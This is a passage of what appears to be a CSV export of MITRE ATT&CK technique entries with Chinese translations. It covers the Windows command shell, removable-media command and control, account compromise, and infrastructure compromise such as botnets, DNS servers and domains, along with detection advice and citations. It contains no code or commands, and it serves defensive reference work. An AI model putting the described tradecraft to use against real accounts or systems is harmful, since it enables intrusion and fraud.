2021),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Trend Micro Tick November 2019),(Citation: FireEye APT17),(Citation: ESET Zebrocy May 2019),(Citation: McAfee Babuk February 2021),(Citation: CoinTicker 2019),(Citation: Palo Alto Comnie),(Citation: Novetta Blockbuster),(Citation: Palo Alto DNS Requests),(Citation: Medium Metamorfo Apr 2020),(Citation: Talos Lokibot Jan 2021),(Citation: Unit 42 Cobalt Gang Oct 2018),(Citation: FireEye admin@338),(Citation: Forcepoint Monsoon),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: NCSC Joint Report Public Tools),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Trustwave GoldenSpy June 2020),(Citation: Github PowerShell Empire),(Citation: Cisco DNSMessenger March 2017),(Citation: Unit 42 BackConfig May 2020),(Citation: FireEye FIN10 June 2017),(Citation: Unit 42 Playbook Dec 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: ESET TeleBots Oct 2018),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: McAfee Gold Dragon),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: Radware Micropsia July 2018),(Citation: Bitdefender APT28 Dec 2015),(Citation: Crowdstrike DNC June 2016),(Citation: McAfee GhostSecret),(Citation: TechNet Cmd),(Citation: Dell Lateral Movement),(Citation: Cisco H1N1 Part 2),(Citation: US-CERT TA18-074A),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Microsoft PLATINUM April 2016),(Citation: Mandiant UNC3313 Feb 2022),(Citation: Unit 42 Bisonal July 2018),(Citation: Medium KONNI Jan 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Picus Sodinokibi January 2020),(Citation: Trend Micro Daserf Nov 2017),(Citation: Symantec Buckeye),(Citation: Dell TG-1314),(Citation: Umbreon Trend Micro),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: PWC Cloud Hopper April 2017),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Talos GravityRAT),(Citation: Group IB Silence Sept 2018),(Citation: Lee 2013),(Citation: Talos Kimsuky Nov 2021),(Citation: Threatpost Lizar May 2021),(Citation: Talos TinyTurla September 2021),(Citation: CyberBit Dtrack),(Citation: Microsoft GALLIUM December 2019),(Citation: Mandiant APT1),(Citation: FireEye APT30),(Citation: PWC KeyBoys Feb 2017),(Citation: RedCanary Mockingbird May 2020),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Symantec Suckfly May 2016),(Citation: Palo Alto OilRig Sep 2018),(Citation: Symantec Linfo May 2012),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: Symantec Backdoor.Mivast),(Citation: Bitdefender FIN8 July 2021),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Talos Cobalt Group July 2018),(Citation: FireEye APT10 Sept 2018),(Citation: ESET Nomadic Octopus 2018),(Citation: Accenture Hogfish April 2018),(Citation: Unit42 BabyShark Feb 2019),(Citation: Trend Micro Muddy Water March 2021),(Citation: Secureworks MCMD July 2019),(Citation: Sophos SamSam Apr 2018),(Citation: ESET GreyEnergy Oct 2018),(Citation: CISA Zebrocy Oct 2020),",命令和脚本解释器/命令和脚本解析器：Windows 命令外壳,攻击者可能会滥用 Windows 命令 shell 来执行。 Windows 命令外壳 ([cmd](https://attack.mitre.org/software/S0106)) 是 Windows 系统上的主要命令提示符。 Windows 命令提示符可用于控制系统的几乎任何方面，不同的命令子集需要不同的权限级别。命令提示符可以通过[远程服务](https://attack.mitre.org/techniques/T1021)如[SSH](https://attack.mitre.org/techniques/T1021/004)远程调用。 （引用：Windows 中的 SSH）批处理文件（例如：.bat 或 .cmd）还为 shell 提供了一系列要运行的顺序命令，以及正常的脚本操作，例如条件和循环。批处理文件的常见用途包括长时间或重复性任务，或者需要在多个系统上运行相同的命令集。攻击者可以利用 [cmd](https://attack.mitre.org/software/S0106) 来执行各种命令和有效载荷。常见用途包括 [cmd](https://attack.mitre.org/software/S0106) 执行单个命令，或滥用 [cmd](https://attack.mitre.org/software/S0106) 与输入交互并通过命令和控制通道转发输出。
T1092,Communication Through Removable Media,"Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.",https://attack.mitre.org/techniques/T1092,31 May 2017,14 July 2020,1.0,Command and Control,Monitor file access on removable media. Detect processes that execute when removable media is mounted.,"Linux, Windows, macOS","Drive: Drive Access, Drive: Drive Creation",False,,,,,,,,,,"(Citation: Microsoft SIR Vol 19),(Citation: ESET Sednit USBStealer 2014),(Citation: ESET Sednit Part 2),(Citation: FireEye APT28),(Citation: TechNet Removable Media Control),(Citation: Microsoft Disable Autorun)",通过移动存储介质进行通信,攻击者可以使用可移动媒体在可能断开连接的网络上的受感染主机之间执行命令和控制，以在系统之间传输命令。这两个系统都需要受到破坏，连接互联网的系统可能首先受到破坏，其次是通过 [通过可移动媒体复制] (https://attack.mitre.org/techniques/T1091) 进行横向移动。命令和文件将从断开连接的系统中继到攻击者可以直接访问的互联网连接系统。
T1586,Compromise Accounts,"Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. 

A variety of methods exist for compromising accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.

Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.

Adversaries may directly leverage compromised email accounts for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).",https://attack.mitre.org/techniques/T1586,01 October 2020,16 October 2021,1.1,Resource Development,"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,"Network Traffic: Network Traffic Content, Persona: Social Media",False,,,,,,,,,,",",盗取账户,攻击者可能会使用可在定位期间使用的服务来盗取帐户。对于包含社会工程的操作，在线角色的使用可能很重要。攻击者可能会盗取现有帐户，而不是创建和培养帐户（即 [Establish Accounts](https://attack.mitre.org/techniques/T1585)）。如果潜在受害者与盗取的角色有关系或了解他们，则利用现有的角色可能会对他们产生一定程度的信任。存在多种方法可以盗取帐户，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 收集凭据、从第三方站点购买凭据或通过暴力破解凭据（例如: 来自违规凭证转储的密码重用）。（引用：AnonHBGary）在入侵帐户之前，攻击者可能会进行侦察，以告知决定哪些帐户要入侵以进一步其操作。角色可能存在于单个站点或跨多个站点（例如：Facebook、LinkedIn、Twitter、Google 等）。被入侵的帐户可能需要额外的开发，这可能包括填写或修改个人资料信息、进一步开发社交网络或合并照片。攻击者可以直接利用受感染的电子邮件帐户进行 [Phishing for Information](https://attack.mitre.org/techniques/T1598) 或 [Phishing](https://attack.mitre.org/techniques/T1566)。
T1586.003,Compromise Accounts: Cloud Accounts,"Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)

A variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, conducting [Password Spraying](https://attack.mitre.org/techniques/T1110/003) attacks, or attempting to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: MSTIC Nobelium Oct 2021) Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) between service providers and their customers.(Citation: MSTIC Nobelium Oct 2021)",https://attack.mitre.org/techniques/T1586/003,27 May 2022,21 October 2022,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).",PRE,,True,T1586,,Francesco Bigarella,,,,,,,",",盗取帐户：云帐户,攻击者可能会盗取可在定位期间使用的云帐户。攻击者可以使用受感染的云帐户来进一步开展他们的操作，包括利用云存储服务（例如 Dropbox、Microsoft OneDrive 或 AWS S3 存储桶）进行 [渗透到云存储](https://attack.mitre.org/techniques/T1567/002 ) 或 [上传工具](https://attack.mitre.org/techniques/T1608/002)s。云账户也可以用于基础设施的获取，如【虚拟专用服务器】(https://attack.mitre.org/techniques/T1583/003)s或【无服务器】(https://attack.mitre. org/techniques/T1583/007) 基础设施。攻击云帐户可能允许攻击者在不管理自己的服务器的情况下开发复杂的功能。（引用：Awake Security C2 Cloud）存在多种攻击云帐户的方法，例如通过 [Phishing for Information] 收集凭据（https://attack .mitre.org/techniques/T1598），从第三方网站购买凭证，进行 [Password Spraying](https://attack.mitre.org/techniques/T1110/003) 攻击，或试图 [窃取应用程序访问令牌](https://attack.mitre.org/techniques/T1528)s.（引用：MSTIC Nobelium Oct 2021）在入侵云帐户之前，攻击者可能会进行侦察，以告知决定要入侵哪些帐户以进一步其操作。在某些情况下，攻击者可能会针对特权服务提供商帐户，以利用服务提供商与其客户之间的 [可信关系](https://attack.mitre.org/techniques/T1199)。（引用：MSTIC Nobelium Oct 2021 )
T1586.002,Compromise Accounts: Email Accounts,"Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566). Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).

A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.

Adversaries can use a compromised email account to hijack existing email threads with targets of interest.",https://attack.mitre.org/techniques/T1586/002,01 October 2020,15 April 2021,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",PRE,,True,T1586,,,,,,,,,"(Citation: IBM ITG18 2020),(Citation: SecureWorks August 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Google TAG Ukraine Threat Landscape March 2022),(Citation: CISA AA21-200A APT40 July 2021),(Citation: VirusBulletin Kimsuky October 2019),(Citation: Checkpoint IndigoZebra July 2021),(Citation: ANSSI Nobelium Phishing December 2021),",盗取帐户：电子邮件帐户,攻击者可能会盗取可在定位期间使用的电子邮件帐户。攻击者可以使用受感染的电子邮件帐户来推进其操作，例如利用它们进行 [Phishing for Information](https://attack.mitre.org/techniques/T1598) 或 [Phishing](https://attack.mitre.组织/技术/T1566）。如果潜在受害者与受感染的角色有关系或了解，则将现有角色与受感染的电子邮件帐户一起使用可能会对潜在受害者产生一定程度的信任。受损的电子邮件帐户也可用于获取基础设施（例如：[域](https://attack.mitre.org/techniques/T1583/001)）。存在多种攻击电子邮件帐户的方法，例如通过 [Phishing for Information] (https://attack.mitre.org/techniques/T1598) 收集凭据、从第三方站点购买凭据或通过暴力破解凭据 (例如：来自违规凭证转储的密码重用）。（引用：AnonHBGary）在入侵电子邮件帐户之前，攻击者可能会进行侦察，以告知有关哪些帐户要入侵以进一步其操作的决定。攻击者可以使用受感染的电子邮件帐户劫持现有电子邮件线程和感兴趣的目标。
T1586.001,Compromise Accounts: Social Media Accounts,"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. 

A variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.

Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.

Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",https://attack.mitre.org/techniques/T1586/001,01 October 2020,16 October 2021,1.1,Resource Development,"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",PRE,"Network Traffic: Network Traffic Content, Persona: Social Media",True,T1586,,,,,,,,,"(Citation: CISA AA21-200A APT40 July 2021),",盗取账户：社交媒体账户,攻击者可能会盗取可在定位期间使用的社交媒体帐户。对于包含社会工程的操作，在线角色的使用可能很重要。攻击者可能会破坏现有的社交媒体帐户，而不是创建和培养社交媒体资料（即 [社交媒体帐户](https://attack.mitre.org/techniques/T1585/001)）。如果潜在受害者与受损的角色有关系或了解他们，则利用现有的角色可能会对他们产生一定程度的信任。存在多种方法可以破坏社交媒体帐户，例如通过 [Phishing for Information](https://attack.mitre.org/techniques/T1598) 收集凭据、从第三方网站购买凭据或通过暴力破解凭据（例如：来自违规凭证转储的密码重用）。（引用：AnonHBGary）在破坏社交媒体帐户之前，攻击者可能会进行侦察，以告知决定哪些帐户可以破坏以进一步其操作。角色可能存在于单个站点或跨多个站点（例如：Facebook、LinkedIn、Twitter 等）。被入侵的社交媒体帐户可能需要额外的开发，这可能包括填写或修改个人资料信息、进一步开发社交网络或合并照片。攻击者可以使用受损的社交媒体资料创建新的或劫持与感兴趣目标的现有联系。这些连接可能是直接的，也可能包括尝试通过其他人进行连接。（引用：NEWSCASTER2014）（引用：BlackHatRobinSage）在攻击者生命周期的其他阶段，例如在初始访问期间（例如：[通过服务进行鱼叉式网络钓鱼]），可能会利用受损的配置文件（https://attack.mitre.org/techniques/T1566/003））。
T1554,Compromise Client Software Binary,"Adversaries may modify client software binaries to establish persistent access to systems. Client software enables users to access services provided by a server. Common client software types are SSH clients, FTP clients, email clients, and web browsers.

Adversaries may make modifications to client software binaries to carry out malicious tasks when those applications are in use. For example, an adversary may copy source code for the client software, add a backdoor, compile for the target, and replace the legitimate application binary (or support files) with the backdoored one. Since these applications may be routinely executed by the user, the adversary can leverage this for persistent access to the host.",https://attack.mitre.org/techniques/T1554,11 February 2020,19 October 2021,1.0,Persistence,"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles. 

Consider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.","Linux, Windows, macOS","File: File Creation, File: File Deletion, File: File Metadata, File: File Modification",False,,,CrowdStrike Falcon OverWatch,,,,,,,"(Citation: wardle evilquest partii),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET ForSSHe December 2018),(Citation: ESET Kobalos Jan 2021),(Citation: ESET Ebury Feb 2014),(Citation: ESET Industroyer),(Citation: reed thiefquest ransomware analysis),",篡改客户端软件二进制包,攻击者可能会修改客户端软件二进制文件以建立对系统的持久访问。客户端软件使用户能够访问服务器提供的服务。常见的客户端软件类型有 SSH 客户端、FTP 客户端、电子邮件客户端和 Web 浏览器。攻击者可能会修改客户端软件二进制文件，以便在使用这些应用程序时执行恶意任务。例如，攻击者可能会复制客户端软件的源代码、添加后门、为目标编译，然后用后门程序替换合法的应用程序二进制文件（或支持文件）。由于这些应用程序可能由用户例行执行，因此攻击者可以利用它来持久访问主机。
T1584,Compromise Infrastructure,"Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.

Use of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) 

By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)",https://attack.mitre.org/techniques/T1584,01 October 2020,26 July 2022,1.2,Resource Development,"Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet. 

Once adversaries have provisioned compromised infrastructure (ex: a server for use in command and control), internet scans may help proactively discover compromised infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS, Internet Scan: Response Content, Internet Scan: Response Metadata",False,,,Jeremy Galloway,,,,,,,",",篡改/破坏基础设施/入侵基础设施,攻击者可能会破坏可在定位期间使用的第三方基础设施。基础架构解决方案包括物理或云服务器、域以及第三方 Web 和 DNS 服务。对手可能会破坏基础设施并在对手生命周期的其他阶段使用它，而不是购买、租赁或租用基础设施。（引用：Mandiant APT1）（引用：ICANNDomainNameHijacking）（引用：Talos DNSpionage Nov 2018）（引用：FireEye EPS Awakens第 2 部分）此外，攻击者可能会破坏许多机器以形成他们可以利用的僵尸网络。使用受损的基础设施可以让对手进行、启动和执行操作。受损的基础设施可以帮助攻击者的操作融入被视为正常的流量，例如与高声誉或可信站点的联系。例如，攻击者可能会利用受损的基础设施（可能还与 [数字证书](https://attack.mitre.org/techniques/T1588/004) 结合使用）进一步融入和支持分阶段的信息收集和/或 [网络钓鱼](https://attack.mitre.org/techniques/T1566) 活动。（引文：FireEye DNS Hijack 2019）通过使用受损的基础设施，攻击者可能很难将他们的行动与他们联系起来。在瞄准之前，对手可能会破坏其他对手的基础设施。（引用：NSA NCSC Turla OilRig）
T1584.005,Compromise Infrastructure: Botnet,"Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems.(Citation: Imperva DDoS for Hire) Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).",https://attack.mitre.org/techniques/T1584/005,01 October 2020,19 April 2022,1.0,Resource Development,"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during [Phishing](https://attack.mitre.org/techniques/T1566), [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499), or [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",PRE,,True,T1584,,,,,,,,,"(Citation: Novetta-Axiom),(Citation: NCSC Cyclops Blink February 2022),",篡改/破坏基础设施/入侵基础设施：僵尸网络,攻击者可能会破坏众多第三方系统，形成一个可在定位期间使用的僵尸网络。僵尸网络是受感染系统的网络，可以被指示执行协调任务。（引文：诺顿僵尸网络）攻击者可以通过入侵众多第三方系统来构建自己的僵尸网络，而不是从引导程序/压力服务中购买/租用僵尸网络.（引文：Imperva DDoS for Hire）攻击者还可能接管现有的僵尸网络，例如将僵尸程序重定向到攻击者控制的 C2 服务器。（引文：Dell Dridex 2015 年 10 月）有了僵尸网络，攻击者可能会执行以下操作- 大规模 [网络钓鱼](https://attack.mitre.org/techniques/T1566) 或分布式拒绝服务 (DDoS) 等活动。
T1584.002,Compromise Infrastructure: DNS Server,"Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.

By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing)",https://attack.mitre.org/techniques/T1584/002,01 October 2020,19 April 2022,1.2,Resource Development,"Consider monitoring for anomalous resolution changes for domain addresses. Efforts may need to be tailored to specific domains of interest as benign resolution changes are a common occurrence on the internet.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Domain Name: Active DNS, Domain Name: Passive DNS",True,T1584,,Jeremy Galloway,,,,,,,",",篡改/破坏基础设施/入侵基础设施：DNS 服务器,攻击者可能会破坏可在定位期间使用的第三方 DNS 服务器。在攻击后活动期间，攻击者可能会将 DNS 流量用于各种任务，包括命令和控制（例如：[应用层协议](https://attack.mitre.org/techniques/T1071)）。攻击者可能会破坏第三方 DNS 服务器以支持操作，而不是设置自己的 DNS 服务器。通过入侵 DNS 服务器，攻击者可以更改 DNS 记录。这种控制可以允许重定向组织的流量，促进攻击者的收集和凭据访问工作。（引文：Talos DNSpionage 2018 年 11 月）（引文：FireEye DNS Hijack 2019）此外，攻击者可以将这种控制与 [数字证书]（https://attack.mitre.org/techniques/T1588/004）将流量重定向到攻击者控制的基础设施，模仿正常的可信网络通信。（引文：FireEye DNS Hijack 2019）（引文：Crowdstrike DNS Hijack 2019）对手也可以静默创建指向恶意服务器的子域，而无需告知 DNS 服务器的实际所有者。（引用：CiscoAngler）（引用：Proofpoint Domain Shadowing）
T1584.001,Compromise Infrastructure: Domains,"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.(Citation: Krebs DNS Hijack 2019)

Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)",https://attack.mitre.org/techniques/T1584/001,01 October 2020,20 April 2022,1.2,Resource Development,"Consider monitoring for anomalous changes to domain registrant information and/or domain resolution information that may indicate the compromise of a domain. Efforts may need to be tailored to specific domains of interest as benign registration and resolution changes are a common occurrence on the internet.

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Domain Name: Active DNS, Domain Name: Domain Registration, Domain Name: Passive DNS",True,T1584,,Jeremy Galloway,,,,,,,"(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: KISA Operation Muzabi),(Citation: Certfa Charming Kitten January 2021),(Citation: Mandiant APT1),(Citation: Proofpoint TA453 July2021),(Citation: ClearSky Kittens Back 3 August 2020),(Citation: McAfee Lazarus Nov 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Mandiant UNC3890 Aug 2022),",篡改/破坏基础设施/入侵基础设施：域,攻击者可能会劫持可在定位期间使用的域和/或子域。域名注册劫持是在未经原始注册人许可的情况下更改域名注册的行为。（引用：ICANNDomainNameHijacking）攻击者可能会获得对列为域所有者的人的电子邮件帐户的访问权限。然后，攻击者可以声称他们忘记了密码，以便更改域注册。其他可能性包括社会工程、域注册帮助台以获取帐户访问权限或利用续订流程漏洞。（引文：Krebs DNS Hijack 2019）当组织的 DNS 条目指向不存在或取消配置的资源时，可能会发生子域劫持.在这种情况下，攻击者可能会控制子域以利用与该域相关的信任来进行操作。（引用：Microsoft Sub Takeover 2020）
T1584.004,Compromise Infrastructure: Server,"Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control. Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.

Adversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).",https://attack.mitre.org/techniques/T1584/004,01 October 2020,17 October 2021,1.1,Resource Development,"Once adversaries have provisioned software on a compromised server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Internet Scan: Response Content, Internet Scan: Response Metadata",True,T1584,,,,,,,,,"(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: McAfee Night Dragon),(Citation: Accenture HyperStack October 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: ClearSky Lazarus Aug 2020),(Citation: Talos TinyTurla September 2021),(Citation: McAfee Lazarus Jul 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Bleeping Computer Op Sharpshooter March 2019),(Citation: FireEye EPS Awakens Part 2),(Citation: Recorded Future Turla Infra 2020),(Citation: ESET Lazarus Jun 2020),(Citation: Gigamon Berserk Bear October 2021),",篡改/破坏基础设施/入侵基础设施：服务器,攻击者可能会破坏可在定位期间使用的第三方服务器。使用服务器允许攻击者准备、启动和执行操作。在攻击后活动期间，攻击者可能会利用服务器执行各种任务，包括命令和控制。攻击者可以不购买 [服务器](https://attack.mitre.org/techniques/T1583/004) 或 [虚拟专用服务器](https://attack.mitre.org/techniques/T1583/003)破坏第三方服务器以支持操作。攻击者也可能破坏 Web 服务器以支持水坑操作，如 [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)。
T1584.007,Compromise Infrastructure: Serverless,"Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. 

